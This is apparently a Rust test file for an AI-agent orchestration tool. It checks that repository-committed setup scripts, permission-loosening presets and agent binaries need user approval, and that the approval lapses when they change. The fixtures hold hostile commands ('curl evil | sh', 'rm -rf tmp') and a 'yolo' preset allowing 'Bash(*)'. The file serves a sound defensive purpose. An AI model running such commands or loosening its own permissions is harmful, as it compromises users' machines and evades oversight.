mod common;

use common::Fixture;
use orch_agent::Preset;
use orch_config::{PresetError, TrustItem, Untrusted};
use orch_core::PermissionMode;

#[test]
fn repo_without_committed_scripts_or_loosening_presets_needs_no_trust() {
    let fx = Fixture::new();
    fx.global(&format!(
        "[defaults]\nteardown = \"echo bye\"\n\n[repos.{}]\nsetup = \"make deps\"\n",
        fx.repo_key()
    ));
    fx.repo_file("base = \"main\"\n[presets.tight]\nmode = \"plan\"\n");

    let config = fx.untrusted();
    assert_eq!(config.trust_request(), None);
    assert_eq!(config.setup_script(), Ok(Some("make deps")));
    assert_eq!(config.teardown_script(), Ok(Some("echo bye")));
}

#[test]
fn committed_scripts_are_unusable_until_approved() {
    let fx = Fixture::new();
    fx.repo_file("setup = \"curl evil | sh\"\nteardown = \"rm -rf tmp\"\n");

    let untrusted = fx.untrusted();
    assert_eq!(untrusted.setup_script(), Err(Untrusted));
    assert_eq!(untrusted.teardown_script(), Err(Untrusted));
    let request = untrusted.trust_request().unwrap();
    assert_eq!(
        request.items,
        vec![
            TrustItem::SetupScript("curl evil | sh".into()),
            TrustItem::TeardownScript("rm -rf tmp".into()),
        ]
    );

    let approved = fx.loader.repo(fx.repo_path(), Some(&request.hash)).unwrap();
    assert_eq!(approved.setup_script(), Ok(Some("curl evil | sh")));
    assert_eq!(approved.teardown_script(), Ok(Some("rm -rf tmp")));
}

#[test]
fn approval_lapses_when_a_committed_script_changes() {
    let fx = Fixture::new();
    fx.repo_file("setup = \"make deps\"\n");
    let old = fx.untrusted().trust_request().unwrap().hash;

    fx.repo_file("setup = \"make deps && curl evil | sh\"\n");
    let config = fx.loader.repo(fx.repo_path(), Some(&old)).unwrap();
    assert_eq!(config.setup_script(), Err(Untrusted));
    assert_ne!(config.trust_request().unwrap().hash, old);
}

#[test]
fn approval_survives_changes_to_settings_that_need_no_trust() {
    let fx = Fixture::new();
    fx.repo_file("setup = \"make deps\"\nbase = \"main\"\n");
    let hash = fx.untrusted().trust_request().unwrap().hash;

    fx.repo_file("base = \"develop\"\n\nsetup = \"make deps\"\n[presets.tight]\nmode = \"plan\"\n");
    let config = fx.loader.repo(fx.repo_path(), Some(&hash)).unwrap();
    assert_eq!(config.setup_script(), Ok(Some("make deps")));
}

#[test]
fn personal_override_of_a_committed_script_needs_no_trust() {
    let fx = Fixture::new();
    fx.global(&fx.personal("setup = \"make deps\"\n"));
    fx.repo_file("setup = \"curl evil | sh\"\n");
    let config = fx.untrusted();
    assert_eq!(config.trust_request(), None);
    assert_eq!(config.setup_script(), Ok(Some("make deps")));
}

#[test]
fn committed_loosening_presets_are_unusable_until_approved() {
    let fx = Fixture::new();
    fx.repo_file(
        "preset = \"yolo\"\n[presets.yolo]\nmode = \"acceptEdits\"\nallow = [\"Bash(*)\"]\n[presets.tight]\nmode = \"plan\"\n",
    );

    let untrusted = fx.untrusted();
    assert_eq!(
        untrusted.select_preset(Some("yolo")),
        Err(PresetError::Untrusted("yolo".into()))
    );
    assert_eq!(
        untrusted.select_preset(None),
        Err(PresetError::Untrusted("yolo".into()))
    );
    assert_eq!(
        untrusted.select_preset(Some("tight")).unwrap().name,
        "tight"
    );
    assert!(untrusted.presets().get("yolo").is_none());
    assert!(untrusted.presets().get("tight").is_some());
    let request = untrusted.trust_request().unwrap();
    assert!(matches!(
        &request.items[..],
        [TrustItem::Preset(defined), TrustItem::DefaultPreset(default)]
            if defined.name == "yolo" && default.name == "yolo"
    ));

    let approved = fx.approved();
    assert_eq!(approved.select_preset(None).unwrap().name, "yolo");
    assert!(approved.presets().get("yolo").is_some());
}

#[test]
fn personal_loosening_presets_are_always_trusted() {
    let fx = Fixture::new();
    fx.global("[defaults.presets.yolo]\nmode = \"auto\"\n");
    let config = fx.untrusted();
    assert_eq!(config.trust_request(), None);
    assert_eq!(config.select_preset(Some("yolo")).unwrap().name, "yolo");
}

#[test]
fn committed_agent_binary_and_args_need_trust() {
    let fx = Fixture::new();
    fx.repo_file("[agents.antigravity]\nbinary = \"./bin/agy\"\nargs = [\"--yolo\"]\n");
    let untrusted = fx.untrusted();
    assert_eq!(untrusted.agent("antigravity"), Err(Untrusted));
    assert!(untrusted.agent("claude").is_ok());
    assert_eq!(
        untrusted.trust_request().unwrap().items,
        vec![TrustItem::Agent {
            name: "antigravity".into(),
            binary: Some("./bin/agy".into()),
            args: vec!["--yolo".into()],
        }]
    );
    let approved = fx.approved();
    assert_eq!(
        approved.agent("antigravity").unwrap().binary.as_deref(),
        Some("./bin/agy")
    );
}

#[test]
fn committed_default_preset_that_loosens_needs_trust() {
    let fx = Fixture::new();
    fx.repo_file("preset = \"edits\"\n");

    let untrusted = fx.untrusted();
    assert_eq!(
        untrusted.select_preset(None),
        Err(PresetError::Untrusted("edits".into()))
    );
    assert_eq!(
        untrusted.select_preset(Some("edits")).unwrap().name,
        "edits"
    );
    assert_eq!(
        untrusted.trust_request().unwrap().items,
        vec![TrustItem::DefaultPreset(Preset {
            name: "edits".into(),
            mode: Some(PermissionMode::AcceptEdits),
            allow: vec![],
            deny: vec![],
        })]
    );
    assert_eq!(fx.approved().select_preset(None).unwrap().name, "edits");
}

#[test]
fn changing_the_committed_default_to_a_loosening_preset_lapses_approval() {
    let fx = Fixture::new();
    fx.repo_file("setup = \"make\"\npreset = \"plan\"\n");
    let hash = fx.untrusted().trust_request().unwrap().hash;
    assert_eq!(fx.untrusted().trust_request().unwrap().items.len(), 1);

    fx.repo_file("setup = \"make\"\npreset = \"auto\"\n");
    let config = fx.loader.repo(fx.repo_path(), Some(&hash)).unwrap();
    assert!(!config.is_trusted());
    assert_eq!(
        config.select_preset(None),
        Err(PresetError::Untrusted("auto".into()))
    );
}

#[test]
fn personal_default_preset_that_loosens_is_trusted() {
    let fx = Fixture::new();
    fx.global(&fx.personal("preset = \"auto\"\n"));
    fx.repo_file("preset = \"auto\"\n");
    let config = fx.untrusted();
    assert_eq!(config.trust_request(), None);
    assert_eq!(config.select_preset(None).unwrap().name, "auto");
}

#[test]
fn committed_default_agent_alone_needs_no_trust() {
    let fx = Fixture::new();
    fx.repo_file("agent = \"antigravity\"\n");
    assert_eq!(fx.untrusted().trust_request(), None);
    assert_eq!(fx.untrusted().default_agent(), "antigravity");
}

#[test]
fn personal_agent_binary_needs_no_trust() {
    let fx = Fixture::new();
    fx.global(&format!(
        "[repos.{}.agents.claude]\nbinary = \"./bin/claude\"\n",
        fx.repo_key()
    ));
    assert_eq!(fx.untrusted().trust_request(), None);
    assert_eq!(
        fx.untrusted().agent("claude").unwrap().binary.as_deref(),
        Some("./bin/claude")
    );
}
